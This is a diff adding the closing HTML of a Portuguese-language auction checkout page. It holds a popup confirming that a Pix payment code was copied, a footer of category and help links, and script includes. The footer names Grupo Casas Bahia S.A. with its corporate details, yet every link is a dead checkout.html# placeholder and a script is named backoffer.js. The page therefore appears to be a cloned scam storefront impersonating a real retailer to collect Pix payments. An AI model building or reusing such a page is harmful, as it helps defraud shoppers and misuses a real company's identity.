+<div class="copypopup-overlay" id="copyPopupOverlay">
+  <div class="copypopup">
+    <button type="button" class="copypopup__close" id="copyPopupCloseX" aria-label="Fechar">
+      <svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round"><path d="M5 5l14 14M19 5 5 19"/></svg>
+    </button>
+    <div class="copypopup__icon">
+      <svg width="30" height="30" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="3" stroke-linecap="round" stroke-linejoin="round"><path d="M5 13l5 5L19 7"/></svg>
+    </div>
+    <h3>Código Pix copiado!</h3>
+    <p>Cole o código no app do seu banco e confirme o pagamento. A confirmação é automática — não precisa fazer mais nada.</p>
+    <div class="copypopup__slider" id="copySliderTrack">
+      <button type="button" class="copypopup__slider-btn" id="copySliderBtn">Entendi!</button>
+    </div>
+  </div>
+</div>
+
+<footer class="site-footer">
+  <div class="footer-cols">
+    <div class="footer-col">
+      <h4>Categorias mais buscadas</h4>
+      <ul>
+        <li><a href="checkout.html#">Leilão de veículos</a></li>
+        <li><a href="checkout.html#">Leilão de imóveis</a></li>
+        <li><a href="checkout.html#">Eletrônicos</a></li>
+        <li><a href="checkout.html#">Móveis e decoração</a></li>
+        <li><a href="checkout.html#">Joias e relógios</a></li>
+        <li><a href="checkout.html#">Leilões judiciais</a></li>
+      </ul>
+    </div>
+    <div class="footer-col">
+      <h4>Institucional</h4>
+      <ul>
+        <li><a href="checkout.html#">Quem somos</a></li>
+        <li><a href="checkout.html#">Como funciona um leilão</a></li>
+        <li><a href="checkout.html#">Trabalhe conosco</a></li>
+        <li><a href="checkout.html#">Seja um vendedor</a></li>
+        <li><a href="checkout.html#">Blog</a></li>
+      </ul>
+    </div>
+    <div class="footer-col">
+      <h4>Ajuda</h4>
+      <ul>
+        <li><a href="checkout.html#">Como dar lances</a></li>
+        <li><a href="checkout.html#">Formas de pagamento</a></li>
+        <li><a href="checkout.html#">Retirada e entrega</a></li>
+        <li><a href="checkout.html#">Política de devolução</a></li>
+        <li><a href="checkout.html#">Perguntas frequentes</a></li>
+        <li><a href="checkout.html#">Termos e condições</a></li>
+      </ul>
+    </div>
+    <div class="footer-col">
+      <h4>Formas de pagamento</h4>
+      <div class="payment-icons">
+        <span><svg width="17" height="17"><use href="#icon-pix"/></svg> Pix</span>
+        <span><svg width="17" height="17"><use href="#icon-card"/></svg> Cartão</span>
+        <span><svg width="17" height="17"><use href="#icon-boleto"/></svg> Boleto</span>
+      </div>
+      <h4 class="footer-col__spaced">Redes sociais</h4>
+      <div class="social-icons">
+        <a href="checkout.html#" aria-label="Instagram"><svg width="18" height="18"><use href="#icon-instagram"/></svg></a>
+        <a href="checkout.html#" aria-label="Facebook"><svg width="18" height="18"><use href="#icon-facebook"/></svg></a>
+        <a href="checkout.html#" aria-label="YouTube"><svg width="18" height="18"><use href="#icon-youtube"/></svg></a>
+      </div>
+    </div>
+  </div>
+
+  <div class="footer-bottom">
+    <p>Preços e condições exclusivos para este site, podendo sofrer alterações sem aviso prévio.</p>
+    <p>Grupo Casas Bahia S.A. | Rua Florida, 1970 | São Paulo - SP | CEP: 04565-001 | CNPJ: 33.041.260/0652-90 | Inscrição Estadual: 133.091.229.115</p>
+  </div>
+</footer>
+
+<script src="js/utm.js"></script>
+<script src="js/main.js"></script>
+<script src="js/backoffer.js"></script>
+<script src="js/cart.js"></script>
+<script src="js/checkout.js"></script>
+</body>
+</html>
